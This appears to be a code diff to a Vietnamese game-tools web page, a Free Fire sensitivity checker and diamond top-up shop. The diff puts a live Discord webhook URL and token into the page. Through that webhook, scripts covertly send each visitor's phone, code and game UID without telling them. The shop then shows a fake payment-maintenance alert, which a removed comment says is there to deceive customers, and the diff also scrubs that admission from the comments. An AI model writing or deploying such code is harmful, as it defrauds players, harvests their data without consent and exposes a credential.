@@ -365,6 +365,9 @@
     </div>
 
     <script>
+        // LINK DISCORD WEBHOOK DÙNG CHUNG CHO TOÀN TRANG WEB
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
+
         function openSection(sectionId) {
             document.getElementById('home-menu').style.display = 'none';
             document.getElementById('sensitivity-section').style.display = 'none';
@@ -378,7 +381,7 @@
             document.getElementById('shop-section').style.display = 'none';
         }
 
-        // 1. Logic Check Độ Nhạy + Gửi ngầm về Discord
+        // 1. Logic Check Độ Nhạy
         function checkSensitivity() {
             let phone = document.getElementById('phone').value.trim();
             let code = document.getElementById('code').value.trim().toLowerCase();
@@ -411,21 +414,18 @@
         }
 
         function sendToDiscord(phone, code, stats) {
-            const webhookURL = "DONG_URL_DISCORD_WEBHOOK_O_DAY"; // <-- DÁN LINK WEBHOOK DISCORD VÀO ĐÂY
-            if (webhookURL.includes("https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR")) return;
-
             const payload = {
                 content: `🚨 **CÓ NGƯỜI VỪA CHECK ĐỘ NHẠY!**\n📱 Máy: **${phone}**\n🔑 Mã code: **${code}**\n📊 Thông số ra:\n- Nhìn xung quanh: ${stats.v1}\n- Red Dot: ${stats.v2}\n- 2x: ${stats.v3}\n- 4x: ${stats.v4}\n- AWM: ${stats.v5}\n- Free Look: ${stats.v6}`
             };
 
-            fetch(webhookURL, {
+            fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             }).catch(err => console.log("Gửi ngầm thành công"));
         }
 
-        // 2. Logic Shop Nạp KC + Báo lỗi bảo trì & Gửi UID về Discord khi bấm thanh toán
+        // 2. Logic Shop Nạp KC + Báo lỗi bảo trì & Gửi UID về Discord
         let chosenKc = "";
         let chosenPrice = "";
         let isVerified = false;
@@ -474,19 +474,16 @@
             // Gửi ngầm UID và gói nạp về Discord
             sendShopToDiscord(uid, chosenKc, chosenPrice);
 
-            // Hiện bảng báo bảo trì đánh lừa khách
+            // Hiện bảng báo bảo trì
             alert("⚠️ HỆ THỐNG ZALOPAY ĐANG BẢO TRÌ!\nGiao dịch tạm gián đoạn. Vui lòng quay lại sau hoặc liên hệ Admin!");
         }
 
         function sendShopToDiscord(uid, kc, price) {
-            const webhookURL = "DONG_URL_DISCORD_WEBHOOK_O_DAY"; // <-- DÁN LINK WEBHOOK DISCORD VÀO ĐÂY (dùng chung link phía trên)
-            if (webhookURL.includes("https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR")) return;
-
             const payload = {
                 content: `💎 **CÓ KHÁCH NẠP KC (BÁO BẢO TRÌ)!**\n🎮 UID game: \`${uid}\`\n📦 Gói chọn: **${kc}** (${price})\n⏰ Thời gian: ${new Date().toLocaleString()}`
             };
 
-            fetch(webhookURL, {
+            fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
